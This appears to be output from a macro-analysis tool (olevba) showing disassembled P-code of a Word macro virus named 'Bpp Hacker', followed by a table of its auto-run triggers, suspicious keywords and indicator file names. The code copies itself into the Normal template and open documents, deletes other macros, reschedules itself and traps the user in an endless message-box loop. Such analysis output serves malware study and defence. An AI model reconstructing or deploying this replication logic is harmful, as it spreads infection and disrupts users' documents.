' 	St DocOk 
' Line #370:
' 	StartForVariable 
' 	Ld Obj 
' 	EndForVariable 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #371:
' 	Ld Obj 
' 	MemLd New 
' 	LitStr 0x0006 "BPPHCK"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St DocOk 
' 	EndIf 
' Line #372:
' 	Ld Obj 
' 	MemLd New 
' 	LitStr 0x0006 "BPPHCK"
' 	Ne 
' 	Ld Obj 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	And 
' 	IfBlock 
' Line #373:
' 	LineCont 0x0004 0A 00 0C 00
' 	LitStr 0x0009 "Deleting "
' 	Ld Obj 
' 	MemLd New 
' 	Add 
' 	LitStr 0x000A " Macro in "
' 	Add 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Add 
' 	LitStr 0x0003 "..."
' 	Add 
' 	Ld Application 
' 	MemSt StatusBar 
' Line #374:
' 	LineCont 0x0004 09 00 0C 00
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld Obj 
' 	MemLd New 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #375:
' 	EndIfBlock 
' Line #376:
' 	StartForVariable 
' 	Ld Obj 
' 	EndForVariable 
' 	NextVar 
' Line #377:
' 	Ld DocOk 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #378:
' 	LineCont 0x0004 05 00 08 00
' 	LitStr 0x002B "Copying Bpp Hacker From Normal Template to "
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Add 
' 	LitStr 0x0003 "..."
' 	Add 
' 	Ld Application 
' 	MemSt StatusBar 
' Line #379:
' 	LineCont 0x0004 09 00 08 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	ParamNamed Destination 
' 	LitStr 0x0006 "BPPHCK"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #380:
' 	EndIfBlock 
' Line #381:
' 	EndSub 
' Line #382:
' Line #383:
' 	FuncDefn (Sub SikatTemplate())
' Line #384:
' 	Dim 
' 	VarDefn NorOk (As Boolean)
' Line #385:
' 	LitVarSpecial (False)
' 	St NorOk 
' Line #386:
' 	StartForVariable 
' 	Ld Obj 
' 	EndForVariable 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #387:
' 	Ld Obj 
' 	MemLd New 
' 	LitStr 0x0006 "BPPHCK"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St NorOk 
' 	EndIf 
' Line #388:
' 	Ld Obj 
' 	MemLd New 
' 	LitStr 0x0006 "BPPHCK"
' 	Ne 
' 	Ld Obj 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	And 
' 	IfBlock 
' Line #389:
' 	LineCont 0x0004 0A 00 0C 00
' 	LitStr 0x0009 "Deleting "
' 	Ld Obj 
' 	MemLd New 
' 	Add 
' 	LitStr 0x001C " Macro in Normal Template..."
' 	Add 
' 	Ld Application 
' 	MemSt StatusBar 
' Line #390:
' 	LineCont 0x0004 09 00 0C 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld Obj 
' 	MemLd New 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #391:
' 	EndIfBlock 
' Line #392:
' 	StartForVariable 
' 	Ld Obj 
' 	EndForVariable 
' 	NextVar 
' Line #393:
' 	Ld NorOk 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #394:
' 	LineCont 0x0004 0A 00 08 00
' 	LitStr 0x0018 "Copying Bpp Hacker From "
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Add 
' 	LitStr 0x0016 " to Normal Template..."
' 	Add 
' 	Ld Application 
' 	MemSt StatusBar 
' Line #395:
' 	LineCont 0x0004 09 00 08 00
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0006 "BPPHCK"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #396:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt DisplayRecentFiles 
' Line #397:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt DisplayRecentFiles 
' Line #398:
' 	EndIfBlock 
' Line #399:
' Line #400:
' 	ArgsCall ChangeCap 0x0000 
' Line #401:
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #402:
' 	OnError (Resume Next) 
' Line #403:
' 	Ld wdDialogFileOpen 
' 	ArgsLd Dialogs 0x0001 
' 	MemLd Show 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #404:
' 	ArgsCall SikatDocument 0x0000 
' Line #405:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #406:
' 	EndIfBlock 
' Line #407:
' 	ArgsCall RestoreCap 0x0000 
' Line #408:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #409:
' Line #410:
' Line #411:
' 	ArgsCall Bablas 0x0000 
' Line #412:
' 	ArgsCall ChangeCap 0x0000 
' Line #413:
' 	ArgsCall SikatTemplate 0x0000 
' Line #414:
' 	OnError (Resume Next) 
' Line #415:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #416:
' 	ArgsCall RestoreCap 0x0000 
' Line #417:
' Line #418:
' 	ArgsCall SikatDocument 0x0000 
' Line #419:
' Line #420:
' 	ArgsCall AutoClose 0x0000 
' Line #421:
' Line #422:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #423:
' 	ArgsCall SikatDocument 0x0000 
' Line #424:
' 	ArgsCall SikatTemplate 0x0000 
' Line #425:
' 	OnError (Resume Next) 
' Line #426:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #427:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #428:
' 	EndIfBlock 
' Line #429:
' 	EndSub 
' Line #430:
' 	FuncDefn (Sub Ancurin())
' Line #431:
' 	Ld Documents 
' 	MemLd Count 
' 	St C 
' Line #432:
' 	Ld C 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #433:
' 	Ld Dockenor 
' 	ArgsMemCall SikatDocument 0x0000 
' Line #434:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #435:
' 	OnError (Resume Next) 
' Line #436:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0009 "Document1"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #437:
' 	ElseBlock 
' 	BoS 0x0000 
' 	Ld Now 
' 	LitStr 0x0008 "00:00:07"
' 	ArgsLd TimeValue 0x0001 
' 	Add 
' 	LitStr 0x0015 "Normal.BPPHCK.Ancurin"
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #438:
' 	EndIfBlock 
' Line #439:
' 	EndSub 
' Line #440:
' 	FuncDefn (Sub SANSAN())
' Line #441:
' 	LitStr 0x0009 " San San "
' 	St nama1 
' Line #442:
' 	LitStr 0x0007 "San San"
' 	St Nama2 
' Line #443:
' 	LitStr 0x0013 "Lagi Ngapainn ???  "
' 	St msg1 
' Line #444:
' 	LitStr 0x0015 "Jangan Ngelamun Yeh.."
' 	St msg2 
' Line #445:
' 	LitStr 0x001D "Kerjain Tuh Tugasnya Yah.... "
' 	St msg3 
' Line #446:
' 	LitStr 0x001F "Buat Yang Laen Aku Minta Maaf  "
' 	St msg4 
' Line #447:
' 	LitStr 0x000A "I Love You"
' 	St msg1 
' Line #448:
' 	LitStr 0x0002 "  "
' 	St msg2 
' Line #449:
' 	LitStr 0x0027 "       This Come From My Heart and Soul"
' 	St msg3 
' Line #450:
' 	LitStr 0x0024 "                  (Cintaku Negeriku)"
' 	St msg4 
' Line #451:
' 	Ld msg1 
' 	LitDI2 0x002C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld msg2 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld msg3 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld msg2 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld msg4 
' 	Add 
' 	Ld vbInformation 
' 	LitStr 0x0006 "Cun..."
' 	ArgsCall MsgBox 0x0003 
' Line #452:
' 	LitDI2 0x0002 
' 	ArgsLd WeekDay 0x0001 
' 	If 
' 	BoSImplicit 
' 	Ld msg1 
' 	Ld nama1 
' 	Add 
' 	Ld vbInformation 
' 	LitStr 0x0006 "Cun..."
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' Line #453:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000A 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0006 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld msg1 
' 	Ld Nama2 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld msg2 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld msg3 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld msg4 
' 	Add 
' 	Ld Nama2 
' 	Add 
' 	Ld vbInformation 
' 	LitStr 0x0006 "SANSAN"
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' Line #454:
' 	EndSub 
' Line #455:
' 	FuncDefn (Sub Cad())
' Line #456:
' 	LitStr 0x0009 " San San "
' 	St nama1 
' Line #457:
' 	LitStr 0x001A "Mau Ngapainn Elu Tuh ???  "
' 	St msg1 
' Line #458:
' 	LitStr 0x001D "Mau Coba-coba Nganggu Yach..."
' 	St msg2 
' Line #459:
' 	LitStr 0x001D "Kerjain Tuh Tugasnya Yah.... "
' 	St msg3 
' Line #460:
' 	LitStr 0x0019 "Masih Mau Coba-coba Nih ?"
' 	St msg4 
' Line #461:
' 	LitStr 0x0017 "Penasaran Yach Omm....?"
' 	St msg5 
' Line #462:
' 	LitStr 0x0014 "Boleh dah dicoba !!!"
' 	St msg6 
' Line #463:
' 	Ld msg1 
' 	LitDI2 0x002C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld msg2 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld msg3 
' 	Add 
' 	Paren 
' 	Ld vbInformation 
' 	LitStr 0x0006 "SANSAN"
' 	ArgsCall MsgBox 0x0003 
' Line #464:
' 	LitDI2 0x0002 
' 	ArgsLd WeekDay 0x0001 
' 	If 
' 	BoSImplicit 
' 	Ld msg4 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld msg5 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld msg6 
' 	Add 
' 	Ld vbInformation 
' 	LitStr 0x0006 "SANSAN"
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' Line #465:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000A 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0006 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld msg1 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld msg2 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld msg3 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld msg4 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld msg5 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld msg6 
' 	Add 
' 	Ld vbInformation 
' 	LitStr 0x0006 "SANSAN"
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' Line #466:
' 	Do 
' Line #467:
' 	ArgsCall SANSAN 0x0000 
' Line #468:
' 	Loop 
' Line #469:
' 	EndSub 
' Line #470:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Application.Visible |May hide the application                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Reg.bat             |Executable file name                         |
|IOC       |start.scr           |Executable file name                         |
|IOC       |startv.bat          |Executable file name                         |
|IOC       |Zap.bat             |Executable file name                         |
|IOC       |Start.exe           |Executable file name                         |
|IOC       |Autoexec.bat        |Executable file name                         |
|IOC       |Application.VBE     |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

